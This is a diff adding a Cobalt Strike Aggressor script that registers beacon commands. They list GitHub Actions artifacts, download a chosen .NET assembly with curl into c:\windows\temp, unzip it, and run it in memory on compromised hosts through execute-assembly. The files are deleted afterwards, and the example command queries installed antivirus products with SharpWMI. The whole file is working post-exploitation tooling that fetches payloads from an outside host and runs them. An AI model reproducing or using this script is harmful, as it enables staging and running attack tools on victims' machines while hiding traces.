@@ -1,0 +1,218 @@
+#  _____                     _              ____ _ _   _   _       _       _                           _     _       
+# | ____|_  _____  ___ _   _| |_ ___       / ___(_) |_| | | |_   _| |__   / \   ___ ___  ___ _ __ ___ | |__ | |_   _ 
+# |  _| \ \/ / _ \/ __| | | | __/ _ \_____| |  _| | __| |_| | | | | '_ \ / _ \ / __/ __|/ _ \ '_ ` _ \| '_ \| | | | |
+# | |___ >  <  __/ (__| |_| | ||  __/_____| |_| | | |_|  _  | |_| | |_) / ___ \\__ \__ \  __/ | | | | | |_) | | |_| |
+# |_____/_/\_\___|\___|\__,_|\__\___|      \____|_|\__|_| |_|\__,_|_.__/_/   \_\___/___/\___|_| |_| |_|_.__/|_|\__, |
+#                                                                                                              |___/ 
+# author @two06
+# author @cx0x2d4 (windows version)
+#                                                                                                               
+#Fetch artifacts from GitHub Actions and execute them with Execute-Assembly.
+#List-GitHubAssembly - retrieve a list of avaialble artifacts from the configured GitHub repo
+#Execute-GitHubAssembly - download and execute the selected artifact
+# -> Execute-GitHubAssembly SharpWMI action=query query="SELECT * FROM AntiVirusProduct" namespace="root\SecurityCenter2"
+#
+
+#CHANGE THESE VALUES
+#user/repo - no leading or training slash
+$repo_url = ""; 
+#username for repo
+$username = "";
+#access token - repo scope
+$access_token = "";
+#Download directory - the place to store the downloaded artifacts
+$download_directory = "c:\\windows\\temp\\";
+
+#Nothing to change below this line
+#-------------------------------------------------------------------
+$api_url = "https://api.github.com/repos/";
+$artifacts_url = "/actions/artifacts";
+%artifactsDetails["artifact"] = @();
+
+# register commands
+# Execute-GitHubAssembly command register
+beacon_command_register(
+    "Execute-GitHubAssembly",  
+    "Fetch a .NET assembly from GitHub actions and execute using Execute-Assembly");
+
+beacon_command_register(
+    "List-GitHubAssembly",
+    "List the assemblies available in the configured GitHub repo. Assemblies can be executed using Execute-GitHubAssembly");
+
+# add acctions for each new command
+# Execute-GitHubAssembly alias
+alias Execute-GitHubAssembly {
+    $args = replace($0, "Execute-GitHubAssembly ", "");
+    $args = replace($args, "$2", "");
+    $args = matches($args, '\s*(.*)\s*')[0]; # Trim whitespaces
+    println($args);
+    btask($1, "Tasked beacon to run $2 using Execute-Assembly from $repo_url");
+    load_artifact_details();
+    $result = check_artifact_name($name => $2);
+    if($result){
+        blog($1, "Found artifact");
+        blog($1, "Downloading to " . $download_directory);
+        $o = download_artifact($name => $2);
+        blog($1, "Downloaded artifact to " . $o);
+        sleep(1000);
+        unzip_file($path => $o);
+        blog($1, "Unzipping " . $o);
+        sleep(1000);
+        $exePath = replace($o, '\.zip', '.exe');
+        blog($1, "Calling Execute-Assembly with unpacked artifact " . $exePath);
+        blog($1, "Files will be cleaned up once execution completes");
+        bexecute_assembly($1, $exePath, $args);
+        sleep(1000);
+        deleteFile($o);
+        deleteFile($exePath);
+    }
+    else{
+        berror($1, "Artifact not found: " . $2);
+    }
+}
+
+alias List-GitHubAssembly{
+    blog($1, "Fetching available assembly names...")
+    load_artifact_details();
+    $names = get_artifact_names();
+    foreach $name ($names){
+        blog($1, "    " .$name);
+    }
+}
+
+#get the artifact zip from GitHub - pass the artifact name in as $name
+sub download_artifact{
+    #first, we need to get the artifact details
+    $DownloadUrl = "";
+    foreach $artifact (%artifactsDetails["artifact"]){
+        if ($artifact["name"] eq $name){
+            $DownloadUrl = $artifact["archive_download_url"];
+            break;
+        }
+    }
+    $out = $download_directory . $name .".zip";
+    make_API_download_request($endpoint => $DownloadUrl, $output => $out);
+    return $out;
+}
+
+sub jsonValueExtract {
+	local('$temp');
+	$temp = replace($1,',','');
+	$temp = replace($temp,'"','');
+	if (charAt($temp, -1) eq ' '){
+		$temp = substr($temp, 0, int(strlen($temp)) - 1 );
+	}
+	return $temp;
+}
+
+#Get the artifact details from GitHub
+sub load_artifact_details{
+    %artifactsDetails["artifact"] = @();
+    local('$temp_id $temp_node_id $temp_name $temp_size_in_bytes $temp_url $temp_archive_download_url $temp_expired $temp_created_at $temp_updated_at');
+    @artifacts = make_API_request($endpoint => $artifacts_url);
+    #@artifacts contains ALL the artifacts, including old builds. we want the most recent builds only. 
+    #luckily, the API returns them in date order, so we can just take the first unique artifact names. 
+
+    #track which names we have already added using a stack
+    @stack = @();
+    foreach $key => $value (@artifacts){
+        if('"id"' isin $value){
+            $temp_id = split(': ', $value)[1];
+            $temp_id = jsonValueExtract($temp_id);
+        }
+        if('"node_id"' isin $value){
+            $temp_node_id = split(': ', $value)[1];
+            $temp_node_id = jsonValueExtract($temp_node_id);
+        }
+        if('"name"' isin $value){
+            $temp_name = split(': ', $value)[1];
+            $temp_name = jsonValueExtract($temp_name);
+        }
+        if('"size_in_bytes"' isin $value){
+            $temp_size_in_bytes = split(': ', $value)[1];
+            $temp_size_in_bytes = jsonValueExtract($temp_size_in_bytes);
+        }
+        if('"url"' isin $value){
+            $temp_url = split(': ', $value)[1];
+            $temp_url = jsonValueExtract($temp_url);
+        }
+        if('"archive_download_url"' isin $value){
+            $temp_archive_download_url = split(': ', $value)[1];
+            $temp_archive_download_url = jsonValueExtract($temp_archive_download_url);
+        }
+        if('"expired"' isin $value){
+            $temp_expired = split(': ', $value)[1];
+            $temp_expired = jsonValueExtract($temp_expired);
+        }
+        if('"created_at"' isin $value){
+            $temp_created_at = split(': ', $value)[1];
+            $temp_created_at = jsonValueExtract($temp_created_at);
+        }
+        if('"updated_at"' isin $value){
+            $temp_updated_at = split(': ', $value)[1];
+            $temp_updated_at = jsonValueExtract($temp_updated_at);
+        }
+        if(('}' isin $value) && ($temp_updated_at ne $null)){
+            if($temp_name in @stack){
+                #do nothing
+            }
+            else{
+                push(@stack, $temp_name);
+                add(%artifactsDetails["artifact"], %(id => $temp_id, node_id => $temp_node_id, name => $temp_name, size_in_bytes => $temp_size_in_bytes, url => $temp_url, archive_download_url => $temp_archive_download_url, expired => $temp_expired, created_at => $temp_created_at, updated_at => $temp_updated_at));
+            }
+        }
+        
+    }    
+}
+
+#Check the artifact is available
+sub check_artifact_name{
+    $names = get_artifact_names();
+    if ($name isin $names){
+        return true;
+    }
+    return false;
+}
+
+#get the names of the artifacts we loaded
+sub get_artifact_names{
+    @stack = @();
+    foreach $artifact (%artifactsDetails["artifact"]){
+        push(@stack, $artifact["name"]);
+    }
+    return @stack;
+}
+
+
+#make an api request using curl - pass the relative endpoint as $endpoint
+sub make_API_request{
+    $cmd = @('curl', '-u ' . $username . ':' . $access_token, $api_url . $repo_url . $endpoint);
+    $curl_command = exec($cmd);
+    $data = readAll($curl_command);
+    closef($curl_command);
+    return $data;
+}
+
+#make an api request using curl, with an output flag - pass the full endpoing as $endpoint and the output path as $output
+sub make_API_download_request{
+    $cmd = @('curl', '-L', '-u ' . $username . ':' . $access_token, '-o', $output, $endpoint);
+    exec($cmd);
+    # Workaround to make sure full binary has been received - thanks https://github.com/SpiderLabs/SharpCompile/blob/master/SharpCompile.cna!
+	$size = -1;
+	$timeout = 40;
+	while ((!-exists $output || $size < 0 || $size < $newsize) && $timeout > 0) {
+		$size = $newsize;
+		$newsize = lof($output);
+		sleep(300);
+		$timeout -= 1;
+	}
+    return;
+}
+
+#unzip a file on disk - pass the path as $path
+sub unzip_file{
+    #powershell -Command expand-archive c:\windows\temp\Seatbelt.zip -Destination c:\windows\temp\
+    $cmd = @('powershell', '-Command', 'expand-archive' , $path, '-Destination', $download_directory);
+    exec($cmd);
+    return;
+}
